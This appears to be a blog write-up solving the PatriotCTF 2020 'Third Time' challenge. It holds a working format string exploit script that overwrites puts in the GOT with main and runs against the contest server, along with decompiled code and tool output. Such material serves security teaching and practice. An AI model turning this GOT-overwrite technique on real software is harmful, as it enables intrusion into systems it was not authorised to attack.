---
layout:     post
title:      PatriotCTF 2020 - Third Time
date:       2020-04-30
summary:    Solution to PatriotCTF 2020 challenge "Third Time"
categories: writeups
thumbnail:  PatriotCTF
tags:
 - patriotctf
 - 2020
 - writeup
 - reverse
 - exploit
 - formatStringExploiter
 - radare2
 - ghidra
---

This challenge was a fun little example of using another tool I wrote a while
back called [formatStringExploiter][formatStringExploiter]. It was also a
painful reminder that I wrote that tool while [pwntools][pwntools] was stuck on
python version 2 and haven't had a chance to update it to be version 3 friendly
yet...

The solution was pretty strait forward. Identify that there's a format string
vulnerability, identify what the "winning" path is, determine what index you
control for the format string, overwrite puts to go back to main, hit enter a
couple times.

# Triage

As usual, let's give it a run.

```raw
$ ./thirdtime
Enter my favorite bytes!
hello
I love these bytes: 
hello
You Lose Ha!
```

Any time you see a blatant echo back to you like this, it should cause you to
check if there was a format string at play. Generally sending a `%x` should be
enough to check.

```raw
$ ./thirdtime
Enter my favorite bytes!
%x
I love these bytes: 
80488fa
You Lose Ha!
```

In this case, we got back a hex value, and so we know that our input is being
evaluated. Since this is a exploitation type challenge, it is helpful to check
the binary protections enabled via [checksec][checksec].

```raw
$ checksec ./thirdtime
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Intel 32-bit is a bit easier to perform format string attacks against, due to
it's calling convention. Specifically, 32-bit passes arguments on the stack,
whereas 64-bit passes arguments in registers first. That's not to say this
challenge would be impossible on 64-bit, but it would be a bit more difficult
to pull off.

No relocation protection is good for us, since it means GOT overwrites are a
possibility. Also, no PIE is similarly good since it means we don't need an
information leak.

# Checking for Targets

So at this point, you should likely be thinking about what GOT entry should I
overwrite? The challenge description hints that we need to get this program to
run three times, which means a likely target would be going back to `main`.

Asking [ghidra][ghidra] for the decompile, let's look at main:

```c
printf("%s","Enter my favorite bytes!\n");
fflush(stdout);
fgets(local_114,0x100,stdin);
printf("%s","I love these bytes: \n");
printf(local_114);
```

So that's the behavior we're seeing visually. Next up:

```c
if (counter == 3) {
  uVar1 = get_exec_mem();
  puVar2 = (undefined4 *)(counter | uVar1);
  if (puVar2 == (undefined4 *)0x0) {
    puts("Failed to Alloc Memory. Challenge dying...");
    uVar3 = 1;
  }
  else {
    *puVar2 = WIN._0_4_;
    puVar2[1] = WIN._4_4_;
    puVar2[2] = WIN._8_4_;
    puVar2[3] = WIN._12_4_;
    puVar2[4] = WIN._16_4_;
    puVar2[5] = WIN._20_4_;
    puVar2[6] = WIN._24_4_;
    puVar2[7] = WIN._28_4_;
    puVar2[8] = WIN._32_4_;
    puVar2[9] = WIN._36_4_;
    puVar2[10] = WIN._40_4_;
    *(undefined2 *)(puVar2 + 0xb) = WIN._44_2_;
    *(undefined *)((int)puVar2 + 0x2e) = WIN[46];
    (*(code *)puVar2)();
    uVar3 = 0;
  }
}
```

That would appear to be the winning path. We need to get that counter up to 3.

```c
else {
  counter = counter + 1;
  lose();
  uVar3 = 0;
}
```

So after we initially lose (which we will), the only code we have to work with
increases the counter by one and calls `lose`. Let's take a look at that
function.

```c
void lose(void)
{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  puts((char *)(iVar1 + 0x1a0));
  return;
}
```

There's our target. What makes `puts` an especially good target? It's
effectively the only resolved symbol that gets called after our input and
before exiting.

Note, with an information leak, it would be possible to determine, for
instance, the GOT table for `_exit` itself which is in libc. In this case, we
don't have that, and we have an easier solution.

# Writing the Exploit

We have everything we need now. Let's go ahead and use
[formatStringExploiter][formatStringExploiter] to help us exploit this.

First up, we need to create a leak function that will take a format string and
return the results. This is where most of the differences between challenges
exist. In our case, we will need to spawn the process, send input, get output,
and close the process.

```python
from pwn import *
from formatStringExploiter.FormatString import FormatString

def exec_fmt(s):
    print(repr(s)) # So we can easier see what's going on
    global p
    p = process("thirdtime")
    p.recvuntil("bytes!\n")
    p.sendline(s)
    out = p.recvall()
    x = out.split("bytes: \n")[1].split("\nYou Lose")[0]
    p.close()
    return x
```

Giving it a run we see:

```python
exec_fmt("%x")
'%x'
[!] Could not find executable 'thirdtime' in $PATH, using './thirdtime' instead
[x] Starting local process './thirdtime'
[+] Starting local process './thirdtime': pid 1780
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './thirdtime' stopped with exit code 0 (pid 1780)
[x] Receiving all data: 42B
[+] Receiving all data: Done (42B)
Out[1]: '80488fa'
```

Looks good. Now let's instantiate the formatStringExploiter class and let it
explore:

```python
elf = ELF("thirdtime")
fmtStr = FormatString(exec_fmt,elf=elf)
# Bunch of output here
fmtStr.index
# 11
```

So there will be a bunch of output as it explores your format string to find
the right offsets and such. In this case, the offset of your input into the
format string is at index 11. We need this because we only get one shot, so we
need to tell the tool the correct index before we connect.

Believe it or not, we have everything ready to exploit now. Here's the script
with comments inline:

```python
from pwn import *
from formatStringExploiter.FormatString import FormatString

def exec_fmt(s):
    print(repr(s))
    global p
    #p = process("thirdtime")
    # Switching to attack the remote side
    p = remote("chal.pctf.competitivecyber.club", 3333)
    p.recvuntil("bytes!\n")
    p.sendline(s)

    # Going interactive since we won't actually return here
    p.interactive()
    
elf = ELF("thirdtime")
# Remember to give it the index and tell it not to explore
fmtStr = FormatString(exec_fmt,elf=elf, index=11, explore_stack=False)

# Overwriting puts with main
fmtStr.write_d(elf.symbols['got.puts'], elf.symbols['main'])

# Hit enter 3 times here
# pctf{iT_w0RKd_oN_my_CoMPtr}
```

Hope this helped show how the formatStringExploiter utility can be helpful.
Updating it to python 3 will be higher up on my list now that pwntools has
fully moved there.

# Downloads
- [thirdtime.zip](https://github.com/NoTeamName/CTF2020/raw/master/PatriotCTF/pwn/third_time/thirdtime.zip)

[angr]: http://angr.io/
[bash]: https://www.gnu.org/software/bash/
[checksec]: https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec
[fork]: http://man7.org/linux/man-pages/man2/fork.2.html
[formatStringExploiter]: https://formatstringexploiter.readthedocs.io/en/latest/
[ghidra]: https://ghidra-sre.org/
[ltrace]: http://man7.org/linux/man-pages/man1/ltrace.1.html
[malloc]: http://man7.org/linux/man-pages/man3/malloc.3.html
[ptrace]: http://man7.org/linux/man-pages/man2/ptrace.2.html
[pwntools]: http://docs.pwntools.com/en/stable/
[radare2]: https://rada.re/n/
[revenge]: https://revenge.readthedocs.io/en/latest/
[strings]: http://man7.org/linux/man-pages/man1/strings.1.html
[xor cipher]: https://en.wikipedia.org/wiki/XOR_cipher
